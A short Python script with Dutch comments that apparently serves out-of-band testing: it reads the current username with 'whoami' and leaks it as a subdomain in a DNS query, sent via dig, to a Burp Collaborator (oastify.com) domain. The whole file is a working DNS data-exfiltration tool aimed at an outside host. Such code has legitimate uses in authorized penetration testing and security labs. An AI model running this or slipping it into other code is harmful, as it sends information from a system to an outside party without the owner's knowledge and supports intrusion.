import subprocess
import re

def exfiltrate_via_dig(oastify_url, dns_server_ip):
    try:

        raw_user = subprocess.check_output("whoami", shell=True).decode('utf-8').strip()
        
        clean_user = re.sub(r'[^a-zA-Z0-9]', '', raw_user)

        full_target = f"{clean_user}.{oastify_url}"
        
        print(f"[*] Verzenden via dig naar {dns_server_ip}: {full_target}")

        cmd = ["dig", f"@{dns_server_ip}", full_target, "+short"]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[+] Verzoek verzonden naar de DNS server.")

    except Exception as e:
        print(f"[-] Fout: {e}")

if __name__ == "__main__":
    # CONFIGURATIE
    MY_OASTIFY = "mwmybaafhu4z2a51z4gfvp9jeak18wwl.oastify.com"  # <--- Je oastify domein
    TARGET_DNS = "10.10.10.2"               # <--- Vervang dit door het IP dat je wilt gebruiken
    
    exfiltrate_via_dig(MY_OASTIFY, TARGET_DNS)
